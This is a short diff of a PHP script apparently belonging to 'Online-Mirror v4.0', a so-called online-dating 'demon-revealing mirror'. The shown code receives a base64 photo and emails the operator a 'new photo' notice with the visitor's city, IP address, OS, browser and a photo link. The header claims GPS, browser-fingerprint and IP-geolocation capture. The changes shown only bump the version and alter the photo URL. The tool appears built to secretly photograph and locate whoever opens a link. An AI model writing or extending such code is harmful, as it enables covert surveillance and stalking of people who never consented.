@@ -1,6 +1,6 @@
 <?php
 /**
- * Online-Mirror v3.0 - 保存照片（接收端）
+ * Online-Mirror v4.0 - 保存照片（接收端）
  * 支持GPS定位 + 浏览器指纹 + IP地理位置
  */
 require_once __DIR__ . '/config.php';
@@ -155,7 +155,7 @@ if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
             $password = getSetting('email_send_password');
             if (!empty($from) && !empty($smtp_host) && !empty($password)) {
                 $subject = '📸 网恋照妖镜 - 新拍照通知';
-                $photo_url = SITE_URL . 'photos.php?id=' . urlencode($id);
+                $photo_url = SITE_URL . 'photos/' . urlencode($id);
                 $time = date('Y-m-d H:i:s');
                 $body = buildEmailBody($id, $city, $client_ip, $os, $browser, $time, $photo_url);
                 sendSmtpMail($to, $subject, $body, $from, $smtp_host, $smtp_port, $smtp_secure, $password);
